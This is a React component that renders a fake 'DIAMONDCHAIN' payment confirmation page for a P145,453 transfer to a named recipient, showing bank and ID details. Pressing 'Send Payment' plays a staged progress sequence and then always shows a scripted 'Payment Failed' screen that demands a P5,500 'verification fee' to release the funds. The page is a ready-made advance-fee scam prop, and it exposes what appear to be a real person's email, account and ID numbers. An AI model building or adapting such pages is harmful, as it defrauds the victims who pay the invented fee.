import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    const originalAddEventListener = document.addEventListener;
    const originalWindowAddEventListener = window.addEventListener;
    
    document.addEventListener = function(event, callback, options) {
      if (event === 'DOMContentLoaded') {
        setTimeout(() => {
          try { callback(new Event('DOMContentLoaded')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalAddEventListener.call(document, event, callback, options);
      }
    };
    
    window.addEventListener = function(event, callback, options) {
      if (event === 'load') {
        setTimeout(() => {
          try { callback(new Event('load')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalWindowAddEventListener.call(window, event, callback, options);
      }
    };
    
    let onloadHandler = null;
    try {
      Object.defineProperty(window, 'onload', {
        set: function(fn) {
          onloadHandler = fn;
          setTimeout(() => {
            try { if (typeof fn === 'function') fn(); } catch (e) { console.error(e); }
          }, 0);
        },
        get: function() { return onloadHandler; },
        configurable: true
      });
    } catch (e) {}
    try {
      
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-2M6V79H761');



        document.addEventListener('DOMContentLoaded', () => {
            const btnSend = document.getElementById('btn-send');
            const viewConf = document.getElementById('view-confirmation');
            const overlayLoading = document.getElementById('overlay-loading');
            const loadingPanel = document.getElementById('loading-panel');
            const viewFailed = document.getElementById('view-failed');
            const statusText = document.getElementById('status-text');
            const progressBar = document.getElementById('progress-bar');
            const amountEl = document.getElementById('anim-amount');

            // 1. Smooth Number Counter Animation
            const targetAmount = 145453;
            const duration = 1800; 
            let startTime = null;

            function animateCount(timestamp) {
                if (!startTime) startTime = timestamp;
                const progress = Math.min((timestamp - startTime) / duration, 1);
                
                // cubic ease out for realistic deceleration
                const easeOut = 1 - Math.pow(1 - progress, 3);
                const current = Math.floor(easeOut * targetAmount);
                
                amountEl.innerText = current.toLocaleString('en-US');

                if (progress < 1) {
                    window.requestAnimationFrame(animateCount);
                } else {
                    amountEl.innerText = targetAmount.toLocaleString('en-US');
                }
            }
            window.requestAnimationFrame(animateCount);


            // 2. Interaction Flow Logic
            btnSend.addEventListener('click', () => {
                
                // Dim and blur background
                viewConf.classList.add('pointer-events-none');
                viewConf.style.opacity = '0.4';
                viewConf.style.filter = 'blur(8px)';

                // Show loading overlay
                overlayLoading.classList.remove('hidden');
                // Force reflow
                void overlayLoading.offsetWidth;
                overlayLoading.classList.remove('opacity-0');
                overlayLoading.classList.add('pointer-events-auto');
                loadingPanel.style.transform = 'scale(1)';

                // Start progress bar
                setTimeout(() => {
                    progressBar.style.width = '100%';
                }, 50);

                // Status text crossfade sequence
                const statuses = [
                    "Initializing transaction...",
                    "Connecting to secure network...",
                    "Validating routing...",
                    "Finalizing request..."
                ];
                let statusIdx = 0;
                
                const intervalId = setInterval(() => {
                    // fade out
                    statusText.style.opacity = '0';
                    
                    setTimeout(() => {
                        statusIdx++;
                        if (statusIdx < statuses.length) {
                            statusText.innerText = statuses[statusIdx];
                            statusText.style.opacity = '1';
                        }
                    }, 300); // Wait for fade out
                    
                }, 1600); // Change text every ~1.6s

                // Transition to Failed Page after 6.5s
                setTimeout(() => {
                    clearInterval(intervalId);
                    
                    // Hide overlay
                    overlayLoading.classList.add('opacity-0');
                    loadingPanel.style.transform = 'scale(0.95)';
                    
                    setTimeout(() => {
                        overlayLoading.classList.add('hidden');
                        viewConf.style.display = 'none'; // fully remove from flow
                        
                        // Show Failed View
                        viewFailed.classList.remove('hidden');
                        // Force reflow
                        void viewFailed.offsetWidth;
                        viewFailed.classList.remove('opacity-0');
                        
                        // Reset body top to show header nicely
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                    }, 300);

                }, 6500);
            });
        });
    
    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
    
    return () => {
      document.addEventListener = originalAddEventListener;
      window.addEventListener = originalWindowAddEventListener;
      try { delete window.onload; } catch (e) {}
    };
  }, []);

  return (
    <>
      

<header className="w-full border-b border-[#E6E8EC] bg-white sticky top-0 z-40">
<div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
<div className="flex items-center gap-3">

<div className="flex items-center justify-center w-8 h-8 rounded bg-[#F5F7FA] border border-[#E6E8EC] text-[#C9A646]">
<iconify-icon icon="solar:shield-star-linear" strokeWidth="1.5" width="20"></iconify-icon>
</div>
<span className="text-sm font-medium tracking-tight text-gray-900">DIAMONDCHAIN</span>
</div>
<div className="flex items-center gap-2 text-[#1E3A8A] bg-[#F5F7FA] px-3 py-1.5 rounded-full border border-[#E6E8EC]">
<iconify-icon icon="solar:lock-keyhole-linear" strokeWidth="1.5" width="14"></iconify-icon>
<span className="text-xs font-medium tracking-tight">Secure Session • TLS Encrypted</span>
</div>
</div>
</header>

<main className="flex-1 w-full max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12" id="view-confirmation">
<div className="mb-8 animate-fade-up">
<h1 className="text-2xl font-medium tracking-tight text-gray-900">Payment Confirmation</h1>
</div>
<div className="grid grid-cols-1 lg:grid-cols-3 gap-6 items-start">

<div className="lg:col-span-2 bg-white rounded-xl border border-[#E6E8EC] shadow-sm animate-fade-up delay-50 overflow-hidden">

<div className="p-6 sm:p-8 border-b border-[#E6E8EC] bg-[#F5F7FA]/50">
<p className="text-sm text-gray-500 mb-1">Transfer Amount</p>
<div className="flex items-baseline gap-2">
<span className="text-2xl font-medium text-gray-400 tracking-tight">P</span>
<span className="text-4xl sm:text-5xl font-medium tracking-tight text-gray-900" id="anim-amount">0</span>
</div>
<p className="text-xs text-gray-500 mt-2 flex items-center gap-1.5">
<iconify-icon icon="solar:info-circle-linear" strokeWidth="1.5" width="14"></iconify-icon>
                        Botswana Pula (BWP)
                    </p>
</div>

<div className="p-6 sm:p-8 grid grid-cols-1 sm:grid-cols-2 gap-y-8 gap-x-12">
<div className="space-y-6">
<div>
<p className="text-xs text-gray-500 mb-1">Date</p>
<p className="text-sm font-medium text-gray-900">April 9, 2026</p>
</div>
<div>
<p className="text-xs text-gray-500 mb-1">Transaction ID</p>
<p className="text-sm font-medium text-gray-900 font-mono tracking-tight bg-[#F5F7FA] px-2 py-1 rounded inline-block border border-[#E6E8EC]">TXN-9482-BCA</p>
</div>
<div>
<p className="text-xs text-gray-500 mb-1">Authorized By</p>
<p className="text-sm font-medium text-gray-900">Mr. Philip</p>
</div>
</div>
<div className="space-y-6">
<div>
<p className="text-xs text-gray-500 mb-1">Recipient</p>
<p className="text-sm font-medium text-gray-900">Mositi Seokolo</p>
<p className="text-xs text-gray-500 mt-0.5">mositiseokolo@yahoo.com</p>
</div>
<div className="pt-4 border-t border-[#E6E8EC]">
<p className="text-xs text-gray-500 mb-3 uppercase tracking-widest font-medium">Destination Bank</p>
<div className="space-y-3">
<div className="flex justify-between">
<span className="text-xs text-gray-500">Bank Name</span>
<span className="text-xs font-medium text-gray-900">First National Bank (FNB)</span>
</div>
<div className="flex justify-between">
<span className="text-xs text-gray-500">Account Number</span>
<span className="text-xs font-medium text-gray-900 font-mono">62318593218</span>
</div>
<div className="flex justify-between">
<span className="text-xs text-gray-500">Account Type</span>
<span className="text-xs font-medium text-gray-900">Gold Account</span>
</div>
<div className="flex justify-between">
<span className="text-xs text-gray-500">Branch Code</span>
<span className="text-xs font-medium text-gray-900 font-mono">283567</span>
</div>
</div>
</div>
</div>
</div>
</div>

<div className="bg-[#F9FAFB] rounded-xl border border-[#E6E8EC] p-6 animate-fade-up delay-100 flex flex-col h-full">
<div className="flex items-center justify-between mb-6">
<h2 className="text-sm font-medium tracking-tight text-gray-900">Verified Identity</h2>
<div className="flex items-center gap-1.5 bg-green-50 border border-green-200 text-green-700 px-2 py-1 rounded-full">
<iconify-icon icon="solar:check-circle-linear" strokeWidth="1.5" width="14"></iconify-icon>
<span className="text-xs font-medium">Verified</span>
</div>
</div>
<div className="flex flex-col items-center mb-6">
<div className="w-20 h-24 bg-[#E6E8EC] rounded-lg mb-4 flex items-center justify-center border border-gray-300 shadow-inner relative overflow-hidden">
<iconify-icon className="text-gray-400" icon="solar:user-linear" strokeWidth="1.5" width="32"></iconify-icon>

<div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/20 to-transparent"></div>
</div>
<div className="text-center w-full space-y-2">
<div className="flex justify-between border-b border-[#E6E8EC] pb-2">
<span className="text-xs text-gray-500">Full Name</span>
<span className="text-xs font-medium text-gray-900">Mositi Seokolo</span>
</div>
<div className="flex justify-between border-b border-[#E6E8EC] pb-2">
<span className="text-xs text-gray-500">ID Number</span>
<span className="text-xs font-medium text-gray-900 font-mono">005720428</span>
</div>
<div className="flex justify-between pb-2">
<span className="text-xs text-gray-500">Gender</span>
<span className="text-xs font-medium text-gray-900">Female</span>
</div>
</div>
</div>
<div className="mt-auto pt-4">
<p className="text-xs text-gray-500 mb-2">Digital Signature</p>
<div className="h-16 bg-white border border-[#E6E8EC] rounded-lg flex items-center justify-center shadow-inner relative opacity-80">

<svg className="opacity-70" fill="none" height="40" stroke="#1E3A8A" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" viewbox="0 0 120 40" width="120">
<path d="M10 25C15 15 20 10 25 20C30 30 35 35 40 25C45 15 48 10 50 15C52 20 50 25 55 20C60 15 65 10 70 20C75 30 80 35 85 25C90 15 95 10 100 20C105 30 110 25 115 20"></path>
</svg>
<div className="absolute bottom-3 left-4 right-4 border-b border-gray-200 border-dashed"></div>
</div>
</div>
</div>

<div className="lg:col-span-3 flex justify-end gap-3 mt-4 animate-fade-up delay-150">
<button className="btn-press px-5 py-2.5 text-sm font-medium text-gray-700 bg-white border border-[#E6E8EC] rounded-lg hover:bg-gray-50 focus:outline-none" type="button">
                    Cancel
                </button>
<button className="btn-press px-6 py-2.5 text-sm font-medium text-white bg-[#C9A646] rounded-lg hover:bg-[#b89539] hover:shadow-sm focus:outline-none flex items-center gap-2" id="btn-send" type="button">
                    Send Payment
                    <iconify-icon icon="solar:arrow-right-linear" strokeWidth="1.5" width="16"></iconify-icon>
</button>
</div>
</div>
</main>

<div className="fixed inset-0 z-50 flex items-center justify-center bg-gray-900/40 backdrop-blur-[6px] opacity-0 pointer-events-none hidden" id="overlay-loading">
<div className="bg-white rounded-xl shadow-xl border border-[#E6E8EC] p-8 max-w-sm w-full mx-4 flex flex-col items-center text-center transform scale-95 transition-transform duration-500" id="loading-panel">
<div className="relative w-12 h-12 mb-6">

<svg className="animate-spin w-12 h-12 text-[#E6E8EC]" fill="none" stroke="currentColor" strokeWidth="2" viewbox="0 0 24 24">
<circle cx="12" cy="12" r="10" stroke-opacity="0.2"></circle>
<path className="text-[#C9A646]" d="M12 2a10 10 0 0 1 10 10" strokeLinecap="round"></path>
</svg>
<div className="absolute inset-0 flex items-center justify-center">
<iconify-icon className="text-[#1E3A8A]" icon="solar:shield-keyhole-linear" strokeWidth="1.5" width="16"></iconify-icon>
</div>
</div>
<div className="h-5 relative w-full mb-6 overflow-hidden flex justify-center items-center">
<p className="text-sm font-medium text-gray-900 absolute transition-opacity duration-300 w-full text-center tracking-tight" id="status-text">
                    Initializing transaction...
                </p>
</div>

<div className="w-full bg-[#F5F7FA] rounded-full h-1.5 overflow-hidden border border-[#E6E8EC]">
<div className="bg-[#1E3A8A] h-1.5 rounded-full w-0 transition-all ease-[cubic-bezier(0.4,0,0.2,1)]" id="progress-bar" style={{transitionDuration: '6s'}}></div>
</div>
<p className="text-xs text-gray-400 mt-4 font-mono tracking-tight">Do not close this window</p>
</div>
</div>

<main className="flex-1 w-full max-w-2xl mx-auto px-4 sm:px-6 py-12 sm:py-20 opacity-0 hidden" id="view-failed">
<div className="flex flex-col items-center text-center animate-fade-up">
<div className="w-16 h-16 bg-[#D92D20]/10 rounded-full flex items-center justify-center mb-6 border border-[#D92D20]/20">
<iconify-icon className="text-[#D92D20]" icon="solar:close-circle-linear" strokeWidth="1.5" width="32"></iconify-icon>
</div>
<h1 className="text-2xl font-medium tracking-tight text-gray-900 mb-8">Payment Failed</h1>
<div className="bg-[#F9FAFB] border border-[#D92D20]/40 rounded-xl p-6 sm:p-8 text-left w-full shadow-sm animate-fade-up delay-50">
<div className="flex items-start gap-3">
<iconify-icon className="text-[#D92D20] mt-0.5 shrink-0" icon="solar:danger-triangle-linear" strokeWidth="1.5" width="20"></iconify-icon>
<div className="space-y-4 text-sm text-gray-700 leading-relaxed">
<p>
                            The transfer failed because the receiving network requires a <span className="font-medium text-gray-900">Cross-Network High-Value Verification</span> fee of <span className="font-medium text-gray-900">P5,500</span>.
                        </p>
<p>
                            This fee is a one-time compliance charge required to unlock the high-value routing channel for the recipient's account.
                        </p>
<p>
                            Until the fee is cleared, the amount of P145,453 remains in a pending state.
                        </p>
<p>
                            Once the P5,500 verification fee is completed, the transaction will automatically process without any further action.
                        </p>
</div>
</div>
</div>
<p className="text-sm text-gray-500 mt-8 mb-8 animate-fade-up delay-100">
                Your payment could not be completed. Please review the details or try again.
            </p>
<div className="flex flex-col sm:flex-row gap-3 w-full sm:justify-center animate-fade-up delay-150">
<button className="btn-press px-6 py-2.5 text-sm font-medium text-gray-700 bg-white border border-[#E6E8EC] rounded-lg hover:bg-gray-50 focus:outline-none w-full sm:w-auto order-2 sm:order-1" type="button">
                    Cancel Transaction
                </button>
<button className="btn-press px-6 py-2.5 text-sm font-medium text-white bg-[#1E3A8A] rounded-lg hover:bg-[#152a66] hover:shadow-sm focus:outline-none flex items-center justify-center gap-2 w-full sm:w-auto order-1 sm:order-2" type="button">
<iconify-icon icon="solar:refresh-linear" strokeWidth="1.5" width="16"></iconify-icon>
                    Retry Payment
                </button>
</div>
</div>
</main>


    </>
  );
}
